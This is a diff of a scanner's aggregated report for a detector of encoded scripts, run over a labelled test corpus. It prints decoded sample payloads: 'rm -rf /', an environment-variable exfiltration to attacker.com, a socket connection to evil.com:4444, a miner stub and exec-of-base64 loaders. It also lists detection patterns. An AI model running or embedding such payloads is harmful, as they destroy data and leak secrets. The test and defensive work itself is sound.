@@ -1,10 +1,64 @@
-Encoded Script Detection Report
-================================
+Aggregated Detection Report
+===========================
 
-Total detections: 1
 
+--- File: accuracy_tests/false_negative_risks/fnr1_double_encoded.py ---
 Detection #1
-File: accuracy_tests\false_negative_risks\fnr5_delayed_execution.py
+File: accuracy_tests/false_negative_risks/fnr1_double_encoded.py
+Line: 5
+Encoding: Base64
+Risk Score: 15
+Encoded Content: YjNNdWMzbHpkR1Z0S0NkbFkyaHZJR2hoWTJ0bFpDY3A=
+Decoded Content: b3Muc3lzdGVtKCdlY2hvIGhhY2tlZCcp
+Suspicious Patterns:
+  - Contains executable Python code
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/false_negative_risks/fnr2_split_payload.py ---
+Detection #1
+File: accuracy_tests/false_negative_risks/fnr2_split_payload.py
+Line: 5
+Encoding: Base64
+Risk Score: 10
+Encoded Content: b3Muc3lzdGVtKCdtYWxp
+Decoded Content: os.system('mali
+Suspicious Patterns:
+  - system_calls: os\.system\s*\(
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/false_negative_risks/fnr4_steganography.py ---
+Detection #1
+File: accuracy_tests/false_negative_risks/fnr4_steganography.py
+Line: 12
+Encoding: Steganography (Comment)
+Risk Score: 30
+Encoded Content: # eval('print("hidden")')  <-- This looks like a comment but could be extracted
+Decoded Content: Suspicious content found inside a code comment.
+Suspicious Patterns:
+  - Code or encoded data hidden in comment
+
+--------------------------------------------------
+
+Detection #2
+File: accuracy_tests/false_negative_risks/fnr4_steganography.py
+Line: 0
+Encoding: Suspicious Code Structure
+Risk Score: 20
+Encoded Content: open(__file__)
+Decoded Content: File reads its own source code, potentially to execute hidden content.
+Suspicious Patterns:
+  - Self-reading source file
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/false_negative_risks/fnr5_delayed_execution.py ---
+Detection #1
+File: accuracy_tests/false_negative_risks/fnr5_delayed_execution.py
 Line: 7
 Encoding: Base64
 Risk Score: 30
@@ -18,7 +72,186 @@ os.system('echo "delayed attack"')
 Suspicious Patterns:
   - system_calls: os\.system\s*\(
   - Contains import statements
-  - Contains valid Python code
+  - Contains executable Python code
 
 --------------------------------------------------
 
+Detection #2
+File: accuracy_tests/false_negative_risks/fnr5_delayed_execution.py
+Line: 8
+Encoding: Suspicious Code Structure
+Risk Score: 25
+Encoded Content: exec(base64.b64decode(payload))
+Decoded Content: exec() called on the result of another function.
+Suspicious Patterns:
+  - High-risk pattern: exec(function())
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/false_positive_risks/fpr1_system_admin.py ---
+Detection #1
+File: accuracy_tests/false_positive_risks/fpr1_system_admin.py
+Line: 9
+Encoding: Base64
+Risk Score: 30
+Encoded Content: CmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwoKZGVmIGdldF...
+Decoded Content: 
+import os
+import subprocess
+
+def get_system_info():
+    """Get system information for monitoring"""...
+Suspicious Patterns:
+  - system_calls: subprocess\.
+  - Contains import statements
+  - Contains executable Python code
+
+--------------------------------------------------
+
+Detection #2
+File: accuracy_tests/false_positive_risks/fpr1_system_admin.py
+Line: 13
+Encoding: Suspicious Code Structure
+Risk Score: 25
+Encoded Content: exec(base64.b64decode(ADMIN_FUNCTIONS))
+Decoded Content: exec() called on the result of another function.
+Suspicious Patterns:
+  - High-risk pattern: exec(function())
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/true_negatives/tn1_config_storage.py ---
+Detection #1
+File: accuracy_tests/true_negatives/tn1_config_storage.py
+Line: 6
+Encoding: Base64
+Risk Score: 15
+Encoded Content: eyJkYXRhYmFzZV91cmwiOiAicG9zdGdyZXM6Ly9sb2NhbGhvc3...
+Decoded Content: {"database_url": "postgres://localhost:5432/mydb", "debug": false}
+Suspicious Patterns:
+  - Contains executable Python code
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/true_positives/tp1_system_command.py ---
+Detection #1
+File: accuracy_tests/true_positives/tp1_system_command.py
+Line: 4
+Encoding: Suspicious Code Structure
+Risk Score: 25
+Encoded Content: exec(base64.b64decode(payload))
+Decoded Content: exec() called on the result of another function.
+Suspicious Patterns:
+  - High-risk pattern: exec(function())
+
+--------------------------------------------------
+
+Detection #2
+File: accuracy_tests/true_positives/tp1_system_command.py
+Line: 3
+Encoding: Base64
+Risk Score: 25
+Encoded Content: b3Muc3lzdGVtKCdybSAtcmYgLycp
+Decoded Content: os.system('rm -rf /')
+Suspicious Patterns:
+  - system_calls: os\.system\s*\(
+  - Contains executable Python code
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/true_positives/tp2_data_exfiltration.py ---
+Detection #1
+File: accuracy_tests/true_positives/tp2_data_exfiltration.py
+Line: 3
+Encoding: Base64
+Risk Score: 40
+Encoded Content: CmltcG9ydCB1cmxsaWIucmVxdWVzdAppbXBvcnQgb3MKZGF0YS...
+Decoded Content: 
+import urllib.request
+import os
+data = str(os.environ)
+urllib.request.urlopen('http://attacker.com/...
+Suspicious Patterns:
+  - network_activity: urllib\.request
+  - file_operations: open\s*\(
+  - Contains import statements
+  - Contains executable Python code
+
+--------------------------------------------------
+
+Detection #2
+File: accuracy_tests/true_positives/tp2_data_exfiltration.py
+Line: 4
+Encoding: Suspicious Code Structure
+Risk Score: 25
+Encoded Content: exec(base64.b64decode(secret_function))
+Decoded Content: exec() called on the result of another function.
+Suspicious Patterns:
+  - High-risk pattern: exec(function())
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/true_positives/tp3_hex_backdoor.py ---
+Detection #1
+File: accuracy_tests/true_positives/tp3_hex_backdoor.py
+Line: 3
+Encoding: Hex (\x)
+Risk Score: 30
+Encoded Content: \x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x...
+Decoded Content: import socket; s=socket.socket(); s.connect(('evil.com', 4444))
+Suspicious Patterns:
+  - network_activity: socket\.
+  - Contains import statements
+  - Contains executable Python code
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/true_positives/tp4_file_deletion.py ---
+Detection #1
+File: accuracy_tests/true_positives/tp4_file_deletion.py
+Line: 4
+Encoding: Suspicious Code Structure
+Risk Score: 25
+Encoded Content: exec(urllib.parse.unquote(command))
+Decoded Content: exec() called on the result of another function.
+Suspicious Patterns:
+  - High-risk pattern: exec(function())
+
+--------------------------------------------------
+
+
+--- File: accuracy_tests/true_positives/tp5_crypto_miner.py ---
+Detection #1
+File: accuracy_tests/true_positives/tp5_crypto_miner.py
+Line: 4
+Encoding: Base64
+Risk Score: 30
+Encoded Content: CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aHJlYWRpbmcKZG...
+Decoded Content: 
+import subprocess
+import threading
+def mine(): subprocess.run(['python', '-c', 'while True: hash("b...
+Suspicious Patterns:
+  - system_calls: subprocess\.
+  - Contains import statements
+  - Contains executable Python code
+
+--------------------------------------------------
+
+Detection #2
+File: accuracy_tests/true_positives/tp5_crypto_miner.py
+Line: 5
+Encoding: Suspicious Code Structure
+Risk Score: 25
+Encoded Content: exec(base64.b64decode(optimizer))
+Decoded Content: exec() called on the result of another function.
+Suspicious Patterns:
+  - High-risk pattern: exec(function())
+
+--------------------------------------------------
